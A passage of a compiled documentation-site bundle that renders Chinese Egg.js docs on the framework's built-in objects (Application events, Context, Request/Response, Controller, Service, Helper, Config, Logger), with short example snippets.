\u662f\u5168\u5c40\u5e94\u7528\u5bf9\u8c61\u3002\u5728\u4e00\u4e2a\u5e94\u7528\u4e2d\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u53ea\u4f1a\u5b9e\u4f8b\u5316\u4e00\u4e2a Application \u5b9e\u4f8b\u3002\u5b83\u7ee7\u627f\u81ea ",r.a.createElement(l["Link"],{to:"http://koajs.com/#application"},"Koa.Application"),"\uff0c\u5728\u5b83\u4e0a\u9762\u6211\u4eec\u53ef\u4ee5\u6302\u8f7d\u4e00\u4e9b\u5168\u5c40\u7684\u65b9\u6cd5\u548c\u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u8f7b\u677e\u7684\u5728\u63d2\u4ef6\u6216\u8005\u5e94\u7528\u4e2d",r.a.createElement(l["AnchorLink"],{to:"./extend#Application"},"\u6269\u5c55 Application \u5bf9\u8c61"),"\u3002"),r.a.createElement("h3",{id:"\u4e8b\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u4e8b\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e8b\u4ef6"),r.a.createElement("p",null,"\u5728\u6846\u67b6\u8fd0\u884c\u65f6\uff0c\u4f1a\u5728 Application \u5b9e\u4f8b\u4e0a\u89e6\u53d1\u4e00\u4e9b\u4e8b\u4ef6\uff0c\u5e94\u7528\u5f00\u53d1\u8005\u6216\u8005\u63d2\u4ef6\u5f00\u53d1\u8005\u53ef\u4ee5\u76d1\u542c\u8fd9\u4e9b\u4e8b\u4ef6\u505a\u4e00\u4e9b\u64cd\u4f5c\u3002\u4f5c\u4e3a\u5e94\u7528\u5f00\u53d1\u8005\uff0c\u6211\u4eec\u4e00\u822c\u4f1a\u5728",r.a.createElement(l["Link"],{to:"./app-start"},"\u542f\u52a8\u81ea\u5b9a\u4e49\u811a\u672c"),"\u4e2d\u8fdb\u884c\u76d1\u542c\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"server"),": \u8be5\u4e8b\u4ef6\u4e00\u4e2a worker \u8fdb\u7a0b\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21\uff0c\u5728 HTTP \u670d\u52a1\u5b8c\u6210\u542f\u52a8\u540e\uff0c\u4f1a\u5c06 HTTP server \u901a\u8fc7\u8fd9\u4e2a\u4e8b\u4ef6\u66b4\u9732\u51fa\u6765\u7ed9\u5f00\u53d1\u8005\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"error"),": \u8fd0\u884c\u65f6\u6709\u4efb\u4f55\u7684\u5f02\u5e38\u88ab onerror \u63d2\u4ef6\u6355\u83b7\u540e\uff0c\u90fd\u4f1a\u89e6\u53d1 ",r.a.createElement("code",null,"error")," \u4e8b\u4ef6\uff0c\u5c06\u9519\u8bef\u5bf9\u8c61\u548c\u5173\u8054\u7684\u4e0a\u4e0b\u6587\uff08\u5982\u679c\u6709\uff09\u66b4\u9732\u7ed9\u5f00\u53d1\u8005\uff0c\u53ef\u4ee5\u8fdb\u884c\u81ea\u5b9a\u4e49\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e0a\u62a5\u7b49\u5904\u7406\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"request")," \u548c ",r.a.createElement("code",null,"response"),": \u5e94\u7528\u6536\u5230\u8bf7\u6c42\u548c\u54cd\u5e94\u8bf7\u6c42\u65f6\uff0c\u5206\u522b\u4f1a\u89e6\u53d1 ",r.a.createElement("code",null,"request")," \u548c ",r.a.createElement("code",null,"response")," \u4e8b\u4ef6\uff0c\u5e76\u5c06\u5f53\u524d\u8bf7\u6c42\u4e0a\u4e0b\u6587\u66b4\u9732\u51fa\u6765\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u76d1\u542c\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u6765\u8fdb\u884c\u65e5\u5fd7\u8bb0\u5f55\u3002")),r.a.createElement(o["a"],{code:"// app.js\n\nmodule.exports = (app) => {\n  app.once('server', (server) => {\n    // websocket\n  });\n  app.on('error', (err, ctx) => {\n    // report error\n  });\n  app.on('request', (ctx) => {\n    // log receive request\n  });\n  app.on('response', (ctx) => {\n    // ctx.starttime is set by framework\n    const used = Date.now() - ctx.starttime;\n    // log total cost\n  });\n};",lang:"js"}),r.a.createElement("h3",{id:"\u83b7\u53d6\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u65b9\u5f0f"),r.a.createElement("p",null,"Application \u5bf9\u8c61\u51e0\u4e4e\u53ef\u4ee5\u5728\u7f16\u5199\u5e94\u7528\u65f6\u7684\u4efb\u4f55\u4e00\u4e2a\u5730\u65b9\u83b7\u53d6\u5230\uff0c\u4e0b\u9762\u4ecb\u7ecd\u51e0\u4e2a\u7ecf\u5e38\u7528\u5230\u7684\u83b7\u53d6\u65b9\u5f0f\uff1a"),r.a.createElement("p",null,"\u51e0\u4e4e\u6240\u6709\u88ab\u6846\u67b6 ",r.a.createElement(l["Link"],{to:"../advanced/loader"},"Loader")," \u52a0\u8f7d\u7684\u6587\u4ef6\uff08Controller\uff0cService\uff0cSchedule \u7b49\uff09\uff0c\u90fd\u53ef\u4ee5 export \u4e00\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab Loader \u8c03\u7528\uff0c\u5e76\u4f7f\u7528 app \u4f5c\u4e3a\u53c2\u6570\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./app-start"},"\u542f\u52a8\u81ea\u5b9a\u4e49\u811a\u672c")),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.cache = new Cache();\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./controller"},"Controller \u6587\u4ef6")),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    this.ctx.body = this.app.cache.get(this.ctx.query.id);\n  }\n}",lang:"js"}))),r.a.createElement("p",null,"\u548c ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," \u4e00\u6837\uff0c\u5728 Context \u5bf9\u8c61\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.app")," \u8bbf\u95ee\u5230 Application \u5bf9\u8c61\u3002\u4ee5\u4e0a\u9762\u7684 Controller \u6587\u4ef6\u4e3e\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    this.ctx.body = this.ctx.app.cache.get(this.ctx.query.id);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5728\u7ee7\u627f\u4e8e Controller, Service \u57fa\u7c7b\u7684\u5b9e\u4f8b\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"this.app")," \u8bbf\u95ee\u5230 Application \u5bf9\u8c61\u3002"),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    this.ctx.body = this.app.cache.get(this.ctx.query.id);\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"Context \u662f\u4e00\u4e2a",r.a.createElement("strong",null,"\u8bf7\u6c42\u7ea7\u522b\u7684\u5bf9\u8c61"),"\uff0c\u7ee7\u627f\u81ea ",r.a.createElement(l["Link"],{to:"http://koajs.com/#context"},"Koa.Context"),"\u3002\u5728\u6bcf\u4e00\u6b21\u6536\u5230\u7528\u6237\u8bf7\u6c42\u65f6\uff0c\u6846\u67b6\u4f1a\u5b9e\u4f8b\u5316\u4e00\u4e2a Context \u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u5c01\u88c5\u4e86\u8fd9\u6b21\u7528\u6237\u8bf7\u6c42\u7684\u4fe1\u606f\uff0c\u5e76\u63d0\u4f9b\u4e86\u8bb8\u591a\u4fbf\u6377\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u8bf7\u6c42\u53c2\u6570\u6216\u8005\u8bbe\u7f6e\u54cd\u5e94\u4fe1\u606f\u3002\u6846\u67b6\u4f1a\u5c06\u6240\u6709\u7684 ",r.a.createElement(l["Link"],{to:"./service"},"Service")," \u6302\u8f7d\u5230 Context \u5b9e\u4f8b\u4e0a\uff0c\u4e00\u4e9b\u63d2\u4ef6\u4e5f\u4f1a\u5c06\u4e00\u4e9b\u5176\u4ed6\u7684\u65b9\u6cd5\u548c\u5bf9\u8c61\u6302\u8f7d\u5230\u5b83\u4e0a\u9762\uff08",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")," \u4f1a\u5c06\u6240\u6709\u7684 model \u6302\u8f7d\u5728 Context \u4e0a\uff09\u3002"),r.a.createElement("h3",{id:"\u83b7\u53d6\u65b9\u5f0f-1"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u65b9\u5f0f-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u65b9\u5f0f"),r.a.createElement("p",null,"\u6700\u5e38\u89c1\u7684 Context \u5b9e\u4f8b\u83b7\u53d6\u65b9\u5f0f\u662f\u5728 ",r.a.createElement(l["Link"],{to:"./middleware"},"Middleware"),", ",r.a.createElement(l["Link"],{to:"./controller"},"Controller")," \u4ee5\u53ca ",r.a.createElement(l["Link"],{to:"./service"},"Service")," \u4e2d\u3002Controller \u4e2d\u7684\u83b7\u53d6\u65b9\u5f0f\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u5df2\u7ecf\u5c55\u793a\u8fc7\u4e86\uff0c\u5728 Service \u4e2d\u83b7\u53d6\u548c Controller \u4e2d\u83b7\u53d6\u7684\u65b9\u5f0f\u4e00\u6837\uff0c\u5728 Middleware \u4e2d\u83b7\u53d6 Context \u5b9e\u4f8b\u5219\u548c ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," \u6846\u67b6\u5728\u4e2d\u95f4\u4ef6\u4e2d\u83b7\u53d6 Context \u5bf9\u8c61\u7684\u65b9\u5f0f\u4e00\u81f4\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u7684 ",r.a.createElement(l["Link"],{to:"./middleware"},"Middleware")," \u540c\u65f6\u652f\u6301 Koa v1 \u548c Koa v2 \u4e24\u79cd\u4e0d\u540c\u7684\u4e2d\u95f4\u4ef6\u5199\u6cd5\uff0c\u6839\u636e\u4e0d\u540c\u7684\u5199\u6cd5\uff0c\u83b7\u53d6 Context \u5b9e\u4f8b\u7684\u65b9\u5f0f\u4e5f\u7a0d\u6709\u4e0d\u540c\uff1a"),r.a.createElement(o["a"],{code:"// Koa v1\nfunction* middleware(next) {\n  // this is instance of Context\n  console.log(this.query);\n  yield next;\n}\n\n// Koa v2\nasync function middleware(ctx, next) {\n  // ctx is instance of Context\n  console.log(ctx.query);\n}",lang:"js"}),r.a.createElement("p",null,"\u9664\u4e86\u5728\u8bf7\u6c42\u65f6\u53ef\u4ee5\u83b7\u53d6 Context \u5b9e\u4f8b\u4e4b\u5916\uff0c \u5728\u6709\u4e9b\u975e\u7528\u6237\u8bf7\u6c42\u7684\u573a\u666f\u4e0b\u6211\u4eec\u9700\u8981\u8bbf\u95ee service / model \u7b49 Context \u5b9e\u4f8b\u4e0a\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"Application.createAnonymousContext()")," \u65b9\u6cd5\u521b\u5efa\u4e00\u4e2a\u533f\u540d Context \u5b9e\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    const ctx = app.createAnonymousContext();\n    // preload before app start\n    await ctx.service.posts.load();\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u5728",r.a.createElement(l["Link"],{to:"./schedule"},"\u5b9a\u65f6\u4efb\u52a1"),"\u4e2d\u7684\u6bcf\u4e00\u4e2a task \u90fd\u63a5\u53d7\u4e00\u4e2a Context \u5b9e\u4f8b\u4f5c\u4e3a\u53c2\u6570\uff0c\u4ee5\u4fbf\u6211\u4eec\u66f4\u65b9\u4fbf\u7684\u6267\u884c\u4e00\u4e9b\u5b9a\u65f6\u7684\u4e1a\u52a1\u903b\u8f91\uff1a"),r.a.createElement(o["a"],{code:"// app/schedule/refresh.js\nexports.task = async (ctx) => {\n  await ctx.service.posts.refresh();\n};",lang:"js"}),r.a.createElement("h2",{id:"request--response"},r.a.createElement(l["AnchorLink"],{to:"#request--response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Request & Response"),r.a.createElement("p",null,"Request \u662f\u4e00\u4e2a",r.a.createElement("strong",null,"\u8bf7\u6c42\u7ea7\u522b\u7684\u5bf9\u8c61"),"\uff0c\u7ee7\u627f\u81ea ",r.a.createElement(l["Link"],{to:"http://koajs.com/#request"},"Koa.Request"),"\u3002\u5c01\u88c5\u4e86 Node.js \u539f\u751f\u7684 HTTP Request \u5bf9\u8c61\uff0c\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u8f85\u52a9\u65b9\u6cd5\u83b7\u53d6 HTTP \u8bf7\u6c42\u5e38\u7528\u53c2\u6570\u3002"),r.a.createElement("p",null,"Response \u662f\u4e00\u4e2a",r.a.createElement("strong",null,"\u8bf7\u6c42\u7ea7\u522b\u7684\u5bf9\u8c61"),"\uff0c\u7ee7\u627f\u81ea ",r.a.createElement(l["Link"],{to:"http://koajs.com/#response"},"Koa.Response"),"\u3002\u5c01\u88c5\u4e86 Node.js \u539f\u751f\u7684 HTTP Response \u5bf9\u8c61\uff0c\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u8f85\u52a9\u65b9\u6cd5\u8bbe\u7f6e HTTP \u54cd\u5e94\u3002"),r.a.createElement("h3",{id:"\u83b7\u53d6\u65b9\u5f0f-2"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u65b9\u5f0f-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u65b9\u5f0f"),r.a.createElement("p",null,"\u53ef\u4ee5\u5728 Context \u7684\u5b9e\u4f8b\u4e0a\u83b7\u53d6\u5230\u5f53\u524d\u8bf7\u6c42\u7684 Request(",r.a.createElement("code",null,"ctx.request"),") \u548c Response(",r.a.createElement("code",null,"ctx.response"),") \u5b9e\u4f8b\u3002"),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    const { app, ctx } = this;\n    const id = ctx.request.query.id;\n    ctx.response.body = app.cache.get(id);\n  }\n}",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," \u4f1a\u5728 Context \u4e0a\u4ee3\u7406\u4e00\u90e8\u5206 Request \u548c Response \u4e0a\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff0c\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"http://koajs.com/#context"},"Koa.Context"),"\u3002"),r.a.createElement("li",null,"\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\u7684 ",r.a.createElement("code",null,"ctx.request.query.id")," \u548c ",r.a.createElement("code",null,"ctx.query.id")," \u662f\u7b49\u4ef7\u7684\uff0c",r.a.createElement("code",null,"ctx.response.body=")," \u548c ",r.a.createElement("code",null,"ctx.body=")," \u662f\u7b49\u4ef7\u7684\u3002"),r.a.createElement("li",null,"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u83b7\u53d6 POST \u7684 body \u5e94\u8be5\u4f7f\u7528 ",r.a.createElement("code",null,"ctx.request.body"),"\uff0c\u800c\u4e0d\u662f ",r.a.createElement("code",null,"ctx.body"),"\u3002")),r.a.createElement("h2",{id:"controller"},r.a.createElement(l["AnchorLink"],{to:"#controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e2a Controller \u57fa\u7c7b\uff0c\u5e76\u63a8\u8350\u6240\u6709\u7684 ",r.a.createElement(l["Link"],{to:"./controller"},"Controller")," \u90fd\u7ee7\u627f\u4e8e\u8be5\u57fa\u7c7b\u5b9e\u73b0\u3002\u8fd9\u4e2a Controller \u57fa\u7c7b\u6709\u4e0b\u5217\u5c5e\u6027\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx")," - \u5f53\u524d\u8bf7\u6c42\u7684 ",r.a.createElement(l["AnchorLink"],{to:"#context"},"Context")," \u5b9e\u4f8b\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app")," - \u5e94\u7528\u7684 ",r.a.createElement(l["AnchorLink"],{to:"#application"},"Application")," \u5b9e\u4f8b\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"config")," - \u5e94\u7528\u7684",r.a.createElement(l["Link"],{to:"./config"},"\u914d\u7f6e"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"service")," - \u5e94\u7528\u6240\u6709\u7684 ",r.a.createElement(l["Link"],{to:"./service"},"service"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"logger")," - \u4e3a\u5f53\u524d controller \u5c01\u88c5\u7684 logger \u5bf9\u8c61\u3002")),r.a.createElement("p",null,"\u5728 Controller \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u6765\u5f15\u7528 Controller \u57fa\u7c7b\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/user.js\n\n// \u4ece egg \u4e0a\u83b7\u53d6\uff08\u63a8\u8350\uff09\nconst Controller = require('egg').Controller;\nclass UserController extends Controller {\n  // implement\n}\nmodule.exports = UserController;\n\n// \u4ece app \u5b9e\u4f8b\u4e0a\u83b7\u53d6\nmodule.exports = (app) => {\n  return class UserController extends app.Controller {\n    // implement\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"service"},r.a.createElement(l["AnchorLink"],{to:"#service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e2a Service \u57fa\u7c7b\uff0c\u5e76\u63a8\u8350\u6240\u6709\u7684 ",r.a.createElement(l["Link"],{to:"./service"},"Service")," \u90fd\u7ee7\u627f\u4e8e\u8be5\u57fa\u7c7b\u5b9e\u73b0\u3002"),r.a.createElement("p",null,"Service \u57fa\u7c7b\u7684\u5c5e\u6027\u548c ",r.a.createElement(l["AnchorLink"],{to:"#controller"},"Controller")," \u57fa\u7c7b\u5c5e\u6027\u4e00\u81f4\uff0c\u8bbf\u95ee\u65b9\u5f0f\u4e5f\u7c7b\u4f3c\uff1a"),r.a.createElement(o["a"],{code:"// app/service/user.js\n\n// \u4ece egg \u4e0a\u83b7\u53d6\uff08\u63a8\u8350\uff09\nconst Service = require('egg').Service;\nclass UserService extends Service {\n  // implement\n}\nmodule.exports = UserService;\n\n// \u4ece app \u5b9e\u4f8b\u4e0a\u83b7\u53d6\nmodule.exports = (app) => {\n  return class UserService extends app.Service {\n    // implement\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"Helper \u7528\u6765\u63d0\u4f9b\u4e00\u4e9b\u5b9e\u7528\u7684 utility \u51fd\u6570\u3002\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u6211\u4eec\u53ef\u4ee5\u5c06\u4e00\u4e9b\u5e38\u7528\u7684\u52a8\u4f5c\u62bd\u79bb\u5728 helper.js \u91cc\u9762\u6210\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u53ef\u4ee5\u7528 JavaScript \u6765\u5199\u590d\u6742\u7684\u903b\u8f91\uff0c\u907f\u514d\u903b\u8f91\u5206\u6563\u5404\u5904\uff0c\u540c\u65f6\u53ef\u4ee5\u66f4\u597d\u7684\u7f16\u5199\u6d4b\u8bd5\u7528\u4f8b\u3002"),r.a.createElement("p",null,"Helper \u81ea\u8eab\u662f\u4e00\u4e2a\u7c7b\uff0c\u6709\u548c ",r.a.createElement(l["AnchorLink"],{to:"#controller"},"Controller")," \u57fa\u7c7b\u4e00\u6837\u7684\u5c5e\u6027\uff0c\u5b83\u4e5f\u4f1a\u5728\u6bcf\u6b21\u8bf7\u6c42\u65f6\u8fdb\u884c\u5b9e\u4f8b\u5316\uff0c\u56e0\u6b64 Helper \u4e0a\u7684\u6240\u6709\u51fd\u6570\u4e5f\u80fd\u83b7\u53d6\u5230\u5f53\u524d\u8bf7\u6c42\u76f8\u5173\u7684\u4e0a\u4e0b\u6587\u4fe1\u606f\u3002"),r.a.createElement("h3",{id:"\u83b7\u53d6\u65b9\u5f0f-3"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u65b9\u5f0f-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u65b9\u5f0f"),r.a.createElement("p",null,"\u53ef\u4ee5\u5728 Context \u7684\u5b9e\u4f8b\u4e0a\u83b7\u53d6\u5230\u5f53\u524d\u8bf7\u6c42\u7684 Helper(",r.a.createElement("code",null,"ctx.helper"),") \u5b9e\u4f8b\u3002"),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    const { app, ctx } = this;\n    const id = ctx.query.id;\n    const user = app.cache.get(id);\n    ctx.body = ctx.helper.formatUser(user);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u9664\u6b64\u4e4b\u5916\uff0cHelper \u7684\u5b9e\u4f8b\u8fd8\u53ef\u4ee5\u5728\u6a21\u677f\u4e2d\u83b7\u53d6\u5230\uff0c\u4f8b\u5982\u53ef\u4ee5\u5728\u6a21\u677f\u4e2d\u83b7\u53d6\u5230 ",r.a.createElement(l["Link"],{to:"../core/security"},"security")," \u63d2\u4ef6\u63d0\u4f9b\u7684 ",r.a.createElement("code",null,"shtml")," \u65b9\u6cd5\u3002"),r.a.createElement(o["a"],{code:"// app/view/home.nj\n{{ helper.shtml(value) }}",lang:"unknown"}),r.a.createElement("h3",{id:"\u81ea\u5b9a\u4e49-helper-\u65b9\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49-helper-\u65b9\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49 helper \u65b9\u6cd5"),r.a.createElement("p",null,"\u5e94\u7528\u5f00\u53d1\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u7ecf\u5e38\u8981\u81ea\u5b9a\u4e49\u4e00\u4e9b helper \u65b9\u6cd5\uff0c\u4f8b\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\u7684 ",r.a.createElement("code",null,"formatUser"),"\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7",r.a.createElement(l["AnchorLink"],{to:"./extend#helper"},"\u6846\u67b6\u6269\u5c55"),"\u7684\u5f62\u5f0f\u6765\u81ea\u5b9a\u4e49 helper \u65b9\u6cd5\u3002"),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nmodule.exports = {\n  formatUser(user) {\n    return only(user, ['name', 'phone']);\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"config"},r.a.createElement(l["AnchorLink"],{to:"#config","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Config"),r.a.createElement("p",null,"\u6211\u4eec\u63a8\u8350\u5e94\u7528\u5f00\u53d1\u9075\u5faa\u914d\u7f6e\u548c\u4ee3\u7801\u5206\u79bb\u7684\u539f\u5219\uff0c\u5c06\u4e00\u4e9b\u9700\u8981\u786c\u7f16\u7801\u7684\u4e1a\u52a1\u914d\u7f6e\u90fd\u653e\u5230\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u540c\u65f6\u914d\u7f6e\u6587\u4ef6\u652f\u6301\u5404\u4e2a\u4e0d\u540c\u7684\u8fd0\u884c\u73af\u5883\u4f7f\u7528\u4e0d\u540c\u7684\u914d\u7f6e\uff0c\u4f7f\u7528\u8d77\u6765\u4e5f\u975e\u5e38\u65b9\u4fbf\uff0c\u6240\u6709\u6846\u67b6\u3001\u63d2\u4ef6\u548c\u5e94\u7528\u7ea7\u522b\u7684\u914d\u7f6e\u90fd\u53ef\u4ee5\u901a\u8fc7 Config \u5bf9\u8c61\u83b7\u53d6\u5230\uff0c\u5173\u4e8e\u6846\u67b6\u7684\u914d\u7f6e\uff0c\u53ef\u4ee5\u8be6\u7ec6\u9605\u8bfb ",r.a.createElement(l["Link"],{to:"./config"},"Config \u914d\u7f6e"),"\u7ae0\u8282\u3002"),r.a.createElement("h3",{id:"\u83b7\u53d6\u65b9\u5f0f-4"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u65b9\u5f0f-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u65b9\u5f0f"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.config")," \u4ece Application \u5b9e\u4f8b\u4e0a\u83b7\u53d6\u5230 config \u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u5728 Controller, Service, Helper \u7684\u5b9e\u4f8b\u4e0a\u901a\u8fc7 ",r.a.createElement("code",null,"this.config")," \u83b7\u53d6\u5230 config \u5bf9\u8c61\u3002"),r.a.createElement("h2",{id:"logger"},r.a.createElement(l["AnchorLink"],{to:"#logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Logger"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86\u529f\u80fd\u5f3a\u5927\u7684",r.a.createElement(l["Link"],{to:"../core/logger"},"\u65e5\u5fd7\u529f\u80fd"),"\uff0c\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u7684\u6253\u5370\u5404\u79cd\u7ea7\u522b\u7684\u65e5\u5fd7\u5230\u5bf9\u5e94\u7684\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u6bcf\u4e00\u4e2a logger \u5bf9\u8c61\u90fd\u63d0\u4f9b\u4e86 4 \u4e2a\u7ea7\u522b\u7684\u65b9\u6cd5\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"logger.debug()")),r.a.createElement("li",null,r.a.createElement("code",null,"logger.info()")),r.a.createElement("li",null,r.a.createElement("code",null,"logger.warn()")),r.a.createElement("li",null,r.a.createElement("code",null,"logger.error()"))),r.a.createElement("p",null,"\u5728\u6846\u67b6\u4e2d\u63d0\u4f9b\u4e86\u591a\u4e2a Logger \u5bf9\u8c61\uff0c\u4e0b\u9762\u6211\u4eec\u7b80\u5355\u7684\u4ecb\u7ecd\u4e00\u4e0b\u5404\u4e2a Logger \u5bf9\u8c61\u7684\u83b7\u53d6\u65b9\u5f0f\u548c\u4f7f\u7528\u573a\u666f\u3002"),r.a.createElement("h3",{id:"app-logger"},r.a.createElement(l["AnchorLink"],{to:"#app-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"App Logger"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.logger")," \u6765\u83b7\u53d6\u5230\u5b83\uff0c\u5982\u679c\u6211\u4eec\u60f3\u505a\u4e00\u4e9b\u5e94\u7528\u7ea7\u522b\u7684\u65e5\u5fd7\u8bb0\u5f55\uff0c\u5982\u8bb0\u5f55\u542f\u52a8\u9636\u6bb5\u7684\u4e00\u4e9b\u6570\u636e\u4fe1\u606f\uff0c\u8bb0\u5f55\u4e00\u4e9b\u4e1a\u52a1\u4e0a\u4e0e\u8bf7\u6c42\u65e0\u5173\u7684\u4fe1\u606f\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7 App Logger \u6765\u5b8c\u6210\u3002"),r.a.createElement("h3",{id:"app-corelogger"},r.a.createElement(l["AnchorLink"],{to:"#app-corelogger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"App CoreLogger"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app.coreLogger")," \u6765\u83b7\u53d6\u5230\u5b83\uff0c\u4e00\u822c\u6211\u4eec\u5728\u5f00\u53d1\u5e94\u7528\u65f6\u90fd\u4e0d\u5e94\u8be5\u901a\u8fc7 CoreLogger 